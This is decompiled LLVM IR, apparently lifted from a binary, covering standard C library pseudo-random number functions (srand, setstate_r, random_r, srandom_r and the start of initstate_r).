define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001f66c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1001f66c, i32* @r27, align 4
  %v4_1001f684 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 ptrtoint (i32* @global_var_10044f68.1242 to i32))
  store i32 268564112, i32* @lr, align 4
  %v1_1001f68c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10044f68.1242 to i32))
  store i32 ptrtoint (i32* @global_var_10044f80 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268564128, i32* @lr, align 4
  %v0_1001f69c = call i32 @srandom_r()
  store i32 %v2_1001f66c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268564140, i32* @lr, align 4
  %v0_1001f6a8 = call i32 @__pthread_cleanup_pop_restore()
  ret i32 %v0_1001f6a8

; uselistorder directives
  uselistorder i32* @global_var_10044f80, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10044f80 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10044f68.1242 to i32), { 0, 4, 1, 3, 2, 5, 6, 7 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1001f6c0 = add i32 %tmp, 12
  %v2_1001f6c0 = inttoptr i32 %v1_1001f6c0 to i32*
  %v3_1001f6c0 = load i32, i32* %v2_1001f6c0, align 4
  store i32 %v3_1001f6c0, i32* %r11.global-to-local, align 4
  %v0_1001f6c4 = load i32, i32* @lr, align 4
  store i32 %v0_1001f6c4, i32* %r0.global-to-local, align 4
  %v1_1001f6cc = add i32 %arg1, 4
  store i32 %v1_1001f6cc, i32* %r3.global-to-local, align 4
  %v1_1001f6d0 = add i32 %tmp, 8
  %v2_1001f6d0 = inttoptr i32 %v1_1001f6d0 to i32*
  %v3_1001f6d0 = load i32, i32* %v2_1001f6d0, align 4
  store i32 %v3_1001f6d0, i32* %r9.global-to-local, align 4
  %v3_1001f6d4 = icmp eq i32 %v3_1001f6c0, 0
  br i1 %v3_1001f6d4, label %dec_label_pc_1001f6e0, label %dec_label_pc_1001f6e8

dec_label_pc_1001f6e0:                            ; preds = %entry
  %v2_1001f6e0 = add i32 %v3_1001f6d0, -4
  %v3_1001f6e0 = inttoptr i32 %v2_1001f6e0 to i32*
  store i32 0, i32* %v3_1001f6e0, align 4
  br label %dec_label_pc_1001f700

dec_label_pc_1001f6e8:                            ; preds = %entry
  %v1_1001f6e8 = add i32 %tmp, 4
  %v2_1001f6e8 = inttoptr i32 %v1_1001f6e8 to i32*
  %v3_1001f6e8 = load i32, i32* %v2_1001f6e8, align 4
  %v2_1001f6ec = sub i32 %v3_1001f6e8, %v3_1001f6d0
  %v4_1001f6f0 = sdiv i32 %v2_1001f6ec, 4
  %v1_1001f6f4 = mul i32 %v4_1001f6f0, 5
  %v2_1001f6f8 = add i32 %v1_1001f6f4, %v3_1001f6c0
  store i32 %v2_1001f6f8, i32* %r0.global-to-local, align 4
  %v2_1001f6fc = add i32 %v3_1001f6d0, -4
  %v3_1001f6fc = inttoptr i32 %v2_1001f6fc to i32*
  store i32 %v2_1001f6f8, i32* %v3_1001f6fc, align 4
  br label %dec_label_pc_1001f700

dec_label_pc_1001f700:                            ; preds = %dec_label_pc_1001f6e0, %dec_label_pc_1001f6e8
  %v0_1001f700 = load i32, i32* %r3.global-to-local, align 4
  %v1_1001f700 = add i32 %v0_1001f700, -4
  %v2_1001f700 = inttoptr i32 %v1_1001f700 to i32*
  %v3_1001f700 = load i32, i32* %v2_1001f700, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002f0c4.1247 to i32), i32* %r9.global-to-local, align 4
  %v2_1001f714 = srem i32 %v3_1001f700, 5
  store i32 %v2_1001f714, i32* %r11.global-to-local, align 4
  %v2_1001f720 = icmp ugt i32 %v2_1001f714, 4
  %v1_1001f724 = mul nsw i32 %v2_1001f714, 4
  store i32 %v1_1001f724, i32* %r0.global-to-local, align 4
  br i1 %v2_1001f720, label %dec_label_pc_1001f790, label %dec_label_pc_1001f734

dec_label_pc_1001f734:                            ; preds = %dec_label_pc_1001f700
  %v3_1001f72c = icmp eq i32 %v2_1001f714, 0
  %v2_1001f728 = add i32 %v1_1001f724, ptrtoint (i32* @global_var_1002f0c4.1247 to i32)
  %v1_1001f734 = add i32 %v1_1001f724, add (i32 ptrtoint (i32* @global_var_1002f0c4.1247 to i32), i32 20)
  %v2_1001f734 = inttoptr i32 %v1_1001f734 to i32*
  %v3_1001f734 = load i32, i32* %v2_1001f734, align 4
  store i32 %v3_1001f734, i32* @r10, align 4
  %v3_1001f738 = inttoptr i32 %v2_1001f728 to i32*
  %v4_1001f738 = load i32, i32* %v3_1001f738, align 4
  store i32 %v4_1001f738, i32* %r9.global-to-local, align 4
  store i32 %v2_1001f714, i32* %v2_1001f6c0, align 4
  %v0_1001f740 = load i32, i32* @r10, align 4
  %v1_1001f740 = mul i32 %v0_1001f740, 4
  store i32 %v1_1001f740, i32* %r0.global-to-local, align 4
  %v2_1001f744 = add i32 %tmp, 16
  %v3_1001f744 = inttoptr i32 %v2_1001f744 to i32*
  store i32 %v0_1001f740, i32* %v3_1001f744, align 4
  %v0_1001f748 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001f748 = add i32 %tmp, 20
  %v3_1001f748 = inttoptr i32 %v2_1001f748 to i32*
  store i32 %v0_1001f748, i32* %v3_1001f748, align 4
  %v0_1001f74c = load i32, i32* %r3.global-to-local, align 4
  %v1_1001f74c = load i32, i32* %r0.global-to-local, align 4
  %v2_1001f74c = add i32 %v1_1001f74c, %v0_1001f74c
  store i32 %v2_1001f74c, i32* @r8, align 4
  br i1 %v3_1001f72c, label %dec_label_pc_1001f784, label %dec_label_pc_1001f754

dec_label_pc_1001f754:                            ; preds = %dec_label_pc_1001f734
  %v1_1001f754 = add i32 %v0_1001f74c, -4
  %v2_1001f754 = inttoptr i32 %v1_1001f754 to i32*
  %v3_1001f754 = load i32, i32* %v2_1001f754, align 4
  %v1_1001f758 = load i32, i32* %r7.global-to-local, align 4
  %v2_1001f758 = sdiv i32 %v3_1001f754, %v1_1001f758
  %v1_1001f75c = load i32, i32* %r9.global-to-local, align 4
  %v2_1001f75c = add i32 %v1_1001f75c, %v2_1001f758
  store i32 %v2_1001f75c, i32* %r9.global-to-local, align 4
  %v1_1001f760 = mul i32 %v2_1001f758, 4
  %v1_1001f764 = load i32, i32* @r10, align 4
  %v2_1001f764 = sdiv i32 %v2_1001f75c, %v1_1001f764
  store i32 %v2_1001f764, i32* %r11.global-to-local, align 4
  %v2_1001f768 = add i32 %v1_1001f760, %v0_1001f74c
  store i32 %v2_1001f768, i32* %r0.global-to-local, align 4
  %v2_1001f76c = add i32 %tmp, 4
  %v3_1001f76c = inttoptr i32 %v2_1001f76c to i32*
  store i32 %v2_1001f768, i32* %v3_1001f76c, align 4
  %v0_1001f770 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001f770 = load i32, i32* @r10, align 4
  %v2_1001f770 = mul i32 %v1_1001f770, %v0_1001f770
  store i32 %v2_1001f770, i32* %r11.global-to-local, align 4
  %v1_1001f774 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001f774 = sub i32 %v1_1001f774, %v2_1001f770
  %v1_1001f778 = mul i32 %v2_1001f774, 4
  %v0_1001f77c = load i32, i32* %r3.global-to-local, align 4
  %v2_1001f77c = add i32 %v1_1001f778, %v0_1001f77c
  store i32 %v2_1001f77c, i32* %r9.global-to-local, align 4
  store i32 %v2_1001f77c, i32* %arg2, align 4
  %v0_1001f784.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1001f784

dec_label_pc_1001f784:                            ; preds = %dec_label_pc_1001f734, %dec_label_pc_1001f754
  %v0_1001f784 = phi i32 [ %v2_1001f74c, %dec_label_pc_1001f734 ], [ %v0_1001f784.pre, %dec_label_pc_1001f754 ]
  %v2_1001f784 = add i32 %tmp, 24
  %v3_1001f784 = inttoptr i32 %v2_1001f784 to i32*
  store i32 %v0_1001f784, i32* %v3_1001f784, align 4
  %v0_1001f788 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1001f788, i32* %v2_1001f6d0, align 4
  %v0_1001f7a4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1001f7a0

dec_label_pc_1001f790:                            ; preds = %dec_label_pc_1001f700
  %v0_1001f790 = call i32 @__errno_location()
  store i32 %v0_1001f790, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1001f798 = inttoptr i32 %v0_1001f790 to i32*
  store i32 22, i32* %v2_1001f798, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1001f7a0

dec_label_pc_1001f7a0:                            ; preds = %dec_label_pc_1001f784, %dec_label_pc_1001f790
  %v0_1001f7a4 = phi i32 [ %v0_1001f7a4.pre, %dec_label_pc_1001f784 ], [ -1, %dec_label_pc_1001f790 ]
  store i32 %v0_1001f6c4, i32* %r0.global-to-local, align 4
  store i32 %v0_1001f7a4, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001f7a4

; uselistorder directives
  uselistorder i32 %v0_1001f7a4, { 1, 0 }
  uselistorder i32 %v0_1001f74c, { 0, 2, 1 }
  uselistorder i32 %v0_1001f740, { 1, 0 }
  uselistorder i32 %v1_1001f724, { 2, 1, 0 }
  uselistorder i32 %v2_1001f714, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v3_1001f6d0, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 1, 5, 2, 6, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_1001f7a0, { 1, 0 }
  uselistorder label %dec_label_pc_1001f784, { 1, 0 }
  uselistorder label %dec_label_pc_1001f700, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1001f7b4 = add i32 %tmp, 12
  %v2_1001f7b4 = inttoptr i32 %v1_1001f7b4 to i32*
  %v3_1001f7b4 = load i32, i32* %v2_1001f7b4, align 4
  %v1_1001f7c0 = add i32 %tmp, 8
  %v2_1001f7c0 = inttoptr i32 %v1_1001f7c0 to i32*
  %v3_1001f7c0 = load i32, i32* %v2_1001f7c0, align 4
  store i32 %v3_1001f7c0, i32* %r7.global-to-local, align 4
  %v3_1001f7c4 = icmp eq i32 %v3_1001f7b4, 0
  br i1 %v3_1001f7c4, label %dec_label_pc_1001f7cc, label %dec_label_pc_1001f7e8

dec_label_pc_1001f7cc:                            ; preds = %entry
  %v1_1001f7cc = inttoptr i32 %v3_1001f7c0 to i32*
  %v2_1001f7cc = load i32, i32* %v1_1001f7cc, align 4
  %v2_1001f7d0 = mul i32 %v2_1001f7cc, 1103515245
  %v1_1001f7d4 = add i32 %v2_1001f7d0, 12345
  %v1_1001f7d8 = urem i32 %v1_1001f7d4, -2147483648
  store i32 %v1_1001f7d8, i32* %r9.global-to-local, align 4
  store i32 %v1_1001f7d8, i32* %v1_1001f7cc, align 4
  %v0_1001f7e0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001f7e0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1001f7e0, i32* %v2_1001f7e0, align 4
  br label %dec_label_pc_1001f83c

dec_label_pc_1001f7e8:                            ; preds = %entry
  %v2_1001f7e8 = load i32, i32* %arg1, align 4
  %v1_1001f7ec = add i32 %tmp, 4
  %v2_1001f7ec = inttoptr i32 %v1_1001f7ec to i32*
  %v3_1001f7ec = load i32, i32* %v2_1001f7ec, align 4
  store i32 %v3_1001f7ec, i32* %r9.global-to-local, align 4
  %v1_1001f7f0 = add i32 %tmp, 24
  %v2_1001f7f0 = inttoptr i32 %v1_1001f7f0 to i32*
  %v3_1001f7f0 = load i32, i32* %v2_1001f7f0, align 4
  %v1_1001f7f4 = add i32 %v2_1001f7e8, 4
  store i32 %v1_1001f7f4, i32* @r8, align 4
  %v1_1001f7f8 = add i32 %v3_1001f7ec, 4
  %v1_1001f7fc = inttoptr i32 %v3_1001f7ec to i32*
  %v2_1001f7fc = load i32, i32* %v1_1001f7fc, align 4
  store i32 %v2_1001f7fc, i32* %r9.global-to-local, align 4
  store i32 %v1_1001f7f8, i32* @r10, align 4
  %v2_1001f808 = icmp ult i32 %v1_1001f7f4, %v3_1001f7f0
  %v1_1001f80c = inttoptr i32 %v2_1001f7e8 to i32*
  %v2_1001f80c = load i32, i32* %v1_1001f80c, align 4
  %v2_1001f810 = add i32 %v2_1001f80c, %v2_1001f7fc
  %v1_1001f814 = udiv i32 %v2_1001f810, 2
  store i32 %v1_1001f814, i32* %r9.global-to-local, align 4
  store i32 %v2_1001f810, i32* %v1_1001f80c, align 4
  %v0_1001f81c = load i32, i32* %r9.global-to-local, align 4
  %v2_1001f81c = inttoptr i32 %arg2 to i32*
  store i32 %v0_1001f81c, i32* %v2_1001f81c, align 4
  br i1 %v2_1001f808, label %dec_label_pc_1001f82c, label %dec_label_pc_1001f824

dec_label_pc_1001f824:                            ; preds = %dec_label_pc_1001f7e8
  %v0_1001f824 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1001f824, i32* @r8, align 4
  br label %dec_label_pc_1001f834

dec_label_pc_1001f82c:                            ; preds = %dec_label_pc_1001f7e8
  %v2_1001f800 = icmp ult i32 %v1_1001f7f8, %v3_1001f7f0
  br i1 %v2_1001f800, label %dec_label_pc_1001f834, label %dec_label_pc_1001f830

dec_label_pc_1001f830:                            ; preds = %dec_label_pc_1001f82c
  %v0_1001f830 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1001f830, i32* @r10, align 4
  br label %dec_label_pc_1001f834

dec_label_pc_1001f834:                            ; preds = %dec_label_pc_1001f82c, %dec_label_pc_1001f824, %dec_label_pc_1001f830
  %v0_1001f834 = load i32, i32* @r10, align 4
  store i32 %v0_1001f834, i32* %v2_1001f7ec, align 4
  %v0_1001f838 = load i32, i32* @r8, align 4
  store i32 %v0_1001f838, i32* %arg1, align 4
  br label %dec_label_pc_1001f83c

dec_label_pc_1001f83c:                            ; preds = %dec_label_pc_1001f7cc, %dec_label_pc_1001f834
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1001f810, { 1, 0 }
  uselistorder i32 %v1_1001f7f8, { 1, 0 }
  uselistorder i32 %v3_1001f7f0, { 1, 0 }
  uselistorder i32 %v3_1001f7ec, { 1, 0, 2 }
  uselistorder i32 %v1_1001f7d8, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1001f83c, { 1, 0 }
  uselistorder label %dec_label_pc_1001f834, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1001f848 = load i32, i32* @lr, align 4
  store i32 %v0_1001f848, i32* %r0.global-to-local, align 4
  %v0_1001f854 = load i32, i32* @r4, align 4
  store i32 %v0_1001f854, i32* @r30, align 4
  %v1_1001f85c = add i32 %v0_1001f854, 12
  %v2_1001f85c = inttoptr i32 %v1_1001f85c to i32*
  %v3_1001f85c = load i32, i32* %v2_1001f85c, align 4
  store i32 %v3_1001f85c, i32* %r0.global-to-local, align 4
  %v2_1001f860 = icmp ugt i32 %v3_1001f85c, 4
  br i1 %v2_1001f860, label %dec_label_pc_1001f910, label %dec_label_pc_1001f868

dec_label_pc_1001f868:                            ; preds = %entry
  %v0_1001f868 = load i32, i32* @r3, align 4
  %v3_1001f868 = icmp eq i32 %v0_1001f868, 0
  %v1_1001f86c = add i32 %v0_1001f854, 8
  %v2_1001f86c = inttoptr i32 %v1_1001f86c to i32*
  %v3_1001f86c = load i32, i32* %v2_1001f86c, align 4
  store i32 %v3_1001f86c, i32* @r10, align 4
  br i1 %v3_1001f868, label %dec_label_pc_1001f874, label %dec_label_pc_1001f878

dec_label_pc_1001f874:                            ; preds = %dec_label_pc_1001f868
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_1001f878

dec_label_pc_1001f878:                            ; preds = %dec_label_pc_1001f868, %dec_label_pc_1001f874
  %v0_1001f87c = phi i32 [ %v0_1001f868, %dec_label_pc_1001f868 ], [ 1, %dec_label_pc_1001f874 ]
  %v3_1001f878 = icmp eq i32 %v3_1001f85c, 0
  %v2_1001f87c = inttoptr i32 %v3_1001f86c to i32*
  store i32 %v0_1001f87c, i32* %v2_1001f87c, align 4
  br i1 %v3_1001f878, label %dec_label_pc_1001f90c, label %dec_label_pc_1001f884

dec_label_pc_1001f884:                            ; preds = %dec_label_pc_1001f878
  %v0_1001f884 = load i32, i32* @r30, align 4
  %v1_1001f884 = add i32 %v0_1001f884, 16
  %v2_1001f884 = inttoptr i32 %v1_1001f884 to i32*
  %v3_1001f884 = load i32, i32* %v2_1001f884, align 4
  store i32 %v3_1001f884, i32* %r11.global-to-local, align 4
  store i32 127773, i32* @r8, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_1001f898 = load i32, i32* @r10, align 4
  store i32 %v3_1001f884, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_1001f884, 0
  br i1 %tmp18, label %dec_label_pc_1001f8d8.preheader, label %dec_label_pc_1001f8d8.preheader.thread

dec_label_pc_1001f8d8.preheader.thread:           ; preds = %dec_label_pc_1001f884
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001f8dc

dec_label_pc_1001f8d8.preheader:                  ; preds = %dec_label_pc_1001f884
  %v1_1001f8d82 = add i32 %v3_1001f884, -1
  store i32 %v1_1001f8d82, i32* %ctr.global-to-local, align 4
  %v2_1001f8d83 = icmp eq i32 %v1_1001f8d82, 0
  br i1 %v2_1001f8d83, label %dec_label_pc_1001f8dc, label %dec_label_pc_1001f8b4

dec_label_pc_1001f8b4:                            ; preds = %dec_label_pc_1001f8d8.preheader, %dec_label_pc_1001f8d4.dec_label_pc_1001f8b4_crit_edge
  %v1_1001f8d4 = phi i32 [ %v2_1001f8d4, %dec_label_pc_1001f8d4.dec_label_pc_1001f8b4_crit_edge ], [ %v0_1001f898, %dec_label_pc_1001f8d8.preheader ]
  %v1_1001f8b4 = phi i32 [ %v1_1001f8b4.pre, %dec_label_pc_1001f8d4.dec_label_pc_1001f8b4_crit_edge ], [ 127773, %dec_label_pc_1001f8d8.preheader ]
  %v0_1001f8b4 = load i32, i32* @r3, align 4
  %v2_1001f8b4 = sdiv i32 %v0_1001f8b4, %v1_1001f8b4
  %v2_1001f8b8 = mul i32 %v2_1001f8b4, %v1_1001f8b4
  %v1_1001f8bc = mul i32 %v2_1001f8b4, 2836
  store i32 %v1_1001f8bc, i32* %r0.global-to-local, align 4
  %v2_1001f8c0 = sub i32 %v0_1001f8b4, %v2_1001f8b8
  %v1_1001f8c4 = mul i32 %v2_1001f8c0, 16807
  %v2_1001f8c8 = sub i32 %v1_1001f8c4, %v1_1001f8bc
  store i32 %v2_1001f8c8, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_1001f8c8, -1
  br i1 %tmp19, label %dec_label_pc_1001f8d4, label %dec_label_pc_1001f8d0

dec_label_pc_1001f8d0:                            ; preds = %dec_label_pc_1001f8b4
  %v1_1001f8d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_1001f8d0 = add i32 %v1_1001f8d0, %v2_1001f8c8
  store i32 %v2_1001f8d0, i32* @r3, align 4
  br label %dec_label_pc_1001f8d4

dec_label_pc_1001f8d4:                            ; preds = %dec_label_pc_1001f8b4, %dec_label_pc_1001f8d0
  %v0_1001f8d4 = phi i32 [ %v2_1001f8c8, %dec_label_pc_1001f8b4 ], [ %v2_1001f8d0, %dec_label_pc_1001f8d0 ]
  %v2_1001f8d4 = add i32 %v1_1001f8d4, 4
  %v3_1001f8d4 = inttoptr i32 %v2_1001f8d4 to i32*
  store i32 %v0_1001f8d4, i32* %v3_1001f8d4, align 4
  %v0_1001f8d8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001f8d8 = add i32 %v0_1001f8d8, -1
  store i32 %v1_1001f8d8, i32* %ctr.global-to-local, align 4
  %v2_1001f8d8 = icmp eq i32 %v1_1001f8d8, 0
  br i1 %v2_1001f8d8, label %dec_label_pc_1001f8d8.dec_label_pc_1001f8dc_crit_edge, label %dec_label_pc_1001f8d4.dec_label_pc_1001f8b4_crit_edge

dec_label_pc_1001f8d4.dec_label_pc_1001f8b4_crit_edge: ; preds = %dec_label_pc_1001f8d4
  %v1_1001f8b4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1001f8b4

dec_label_pc_1001f8d8.dec_label_pc_1001f8dc_crit_edge: ; preds = %dec_label_pc_1001f8d4
  %v0_1001f8dc.pre = load i32, i32* @r30, align 4
  %v0_1001f8e0.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1001f8e4.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_1001f8dc

dec_label_pc_1001f8dc:                            ; preds = %dec_label_pc_1001f8d8.preheader.thread, %dec_label_pc_1001f8d8.dec_label_pc_1001f8dc_crit_edge, %dec_label_pc_1001f8d8.preheader
  %v0_1001f8e4 = phi i32 [ %v0_1001f8e4.pre, %dec_label_pc_1001f8d8.dec_label_pc_1001f8dc_crit_edge ], [ %v0_1001f898, %dec_label_pc_1001f8d8.preheader ], [ %v0_1001f898, %dec_label_pc_1001f8d8.preheader.thread ]
  %v0_1001f8e0 = phi i32 [ %v0_1001f8e0.pre, %dec_label_pc_1001f8d8.dec_label_pc_1001f8dc_crit_edge ], [ %v3_1001f884, %dec_label_pc_1001f8d8.preheader ], [ %v3_1001f884, %dec_label_pc_1001f8d8.preheader.thread ]
  %v1_1001f8e4 = phi i32 [ %v0_1001f8dc.pre, %dec_label_pc_1001f8d8.dec_label_pc_1001f8dc_crit_edge ], [ %v0_1001f884, %dec_label_pc_1001f8d8.preheader ], [ %v0_1001f884, %dec_label_pc_1001f8d8.preheader.thread ]
  %v1_1001f8dc = add i32 %v1_1001f8e4, 20
  %v2_1001f8dc = inttoptr i32 %v1_1001f8dc to i32*
  %v3_1001f8dc = load i32, i32* %v2_1001f8dc, align 4
  store i32 %v3_1001f8dc, i32* %r0.global-to-local, align 4
  %v1_1001f8e0 = mul i32 %v0_1001f8e0, 10
  store i32 %v1_1001f8e0, i32* %r31.global-to-local, align 4
  %v2_1001f8e4 = add i32 %v1_1001f8e4, 4
  %v3_1001f8e4 = inttoptr i32 %v2_1001f8e4 to i32*
  store i32 %v0_1001f8e4, i32* %v3_1001f8e4, align 4
  %v0_1001f8e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001f8e8 = mul i32 %v0_1001f8e8, 4
  %v0_1001f8ec = load i32, i32* @r10, align 4
  %v2_1001f8ec = add i32 %v0_1001f8ec, %v1_1001f8e8
  store i32 %v2_1001f8ec, i32* %r0.global-to-local, align 4
  %v1_1001f8f0 = load i32, i32* @r30, align 4
  %v2_1001f8f0 = inttoptr i32 %v1_1001f8f0 to i32*
  store i32 %v2_1001f8ec, i32* %v2_1001f8f0, align 4
  %v2_1001f904 = ptrtoint i32* %stack_var_-24 to i32
  %v0_1001f8fc21 = load i32, i32* %r31.global-to-local, align 4
  %v1_1001f8fc22 = add i32 %v0_1001f8fc21, -1
  store i32 %v1_1001f8fc22, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1001f8fc22, -1
  br i1 %tmp2025, label %dec_label_pc_1001f8f8, label %dec_label_pc_1001f90c

dec_label_pc_1001f8f8:                            ; preds = %dec_label_pc_1001f8dc, %dec_label_pc_1001f8f8
  %v0_1001f90026 = load i32, i32* @r30, align 4
  %v2_1001f8f8 = inttoptr i32 %v0_1001f90026 to i32*
  %v3_1001f8f8 = call i32 @__GI_random_r(i32* %v2_1001f8f8, i32 %v2_1001f904)
  %v0_1001f8fc = load i32, i32* @r31, align 4
  %v1_1001f8fc = add i32 %v0_1001f8fc, -1
  store i32 %v1_1001f8fc, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_1001f8fc, -1
  br i1 %tmp20, label %dec_label_pc_1001f8f8, label %dec_label_pc_1001f90c

dec_label_pc_1001f90c:                            ; preds = %dec_label_pc_1001f8dc, %dec_label_pc_1001f8f8, %dec_label_pc_1001f878
  br label %dec_label_pc_1001f910

dec_label_pc_1001f910:                            ; preds = %entry, %dec_label_pc_1001f90c
  %v0_1001f914 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1001f90c ]
  store i32 %v0_1001f848, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001f914

; uselistorder directives
  uselistorder i32 %v1_1001f8d8, { 1, 0 }
  uselistorder i32 %v2_1001f8d4, { 1, 0 }
  uselistorder i32 %v2_1001f8c8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1001f8b4, { 1, 0 }
  uselistorder i32 %v0_1001f898, { 1, 2, 0 }
  uselistorder i32 %v3_1001f884, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_1001f910, { 1, 0 }
  uselistorder label %dec_label_pc_1001f90c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001f8f8, { 1, 0 }
  uselistorder label %dec_label_pc_1001f8dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001f8d4, { 1, 0 }
  uselistorder label %dec_label_pc_1001f8b4, { 1, 0 }
  uselistorder label %dec_label_pc_1001f878, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1001f92c = load i32, i32* @lr, align 4
  store i32 %v0_1001f92c, i32* %r0.global-to-local, align 4
  %v2_1001f930 = icmp ugt i32 %arg2, 127
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002f0c4.1247 to i32), i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_1001f948 = sub i32 255, %arg2
  %v2_1001f948 = sub i32 -1, %arg2
  %not.v5_1001f948 = icmp ugt i32 %v1_1001f948, %v2_1001f948
  %v6_1001f94c = sext i1 %not.v5_1001f948 to i32
  %v1_1001f950 = add i32 %tmp, 4
  store i32 %v1_1001f950, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_1001f960 = sub nsw i32 3, %v6_1001f94c
  store i32 %v1_1001f960, i32* @r31, align 4
  br i1 %v2_1001f930, label %dec_label_pc_1001f988, label %dec_label_pc_1001f968

dec_label_pc_1001f968:                            ; preds = %entry
  %v2_1001f93c = icmp ugt i32 %arg2, 31
  %v1_1001f968 = sub i32 63, %arg2
  %not.v5_1001f968 = icmp ugt i32 %v1_1001f968, %v2_1001f948
  %v6_1001f96c = sext i1 %not.v5_1001f968 to i32
  %v1_1001f974 = sub nsw i32 1, %v6_1001f96c
  store i32 %v1_1001f974, i32* @r31, align 4
  br i1 %v2_1001f93c, label %dec_label_pc_1001f988, label %dec_label_pc_1001f97c

dec_label_pc_1001f97c:                            ; preds = %dec_label_pc_1001f968
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp6 = icmp ult i32 %arg2, 8
  br i1 %tmp6, label %dec_label_pc_1001f9e8, label %dec_label_pc_1001f988

dec_label_pc_1001f988:                            ; preds = %dec_label_pc_1001f97c, %dec_label_pc_1001f968, %entry
  %v0_1001f988 = phi i32 [ 0, %dec_label_pc_1001f97c ], [ %v1_1001f974, %dec_label_pc_1001f968 ], [ %v1_1001f960, %entry ]
  %v1_1001f988 = mul nsw i32 %v0_1001f988, 4
  store i32 %v1_1001f988, i32* %r0.global-to-local, align 4
  %v2_1001f98c = add i32 %arg3, 12
  %v3_1001f98c = inttoptr i32 %v2_1001f98c to i32*
  store i32 %v0_1001f988, i32* %v3_1001f98c, align 4
  %v0_1001f990 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001f990 = load i32, i32* %r11.global-to-local, align 4
  %v2_1001f990 = add i32 %v1_1001f990, %v0_1001f990
  store i32 %v2_1001f990, i32* %r9.global-to-local, align 4
  %v3_1001f994 = inttoptr i32 %v2_1001f990 to i32*
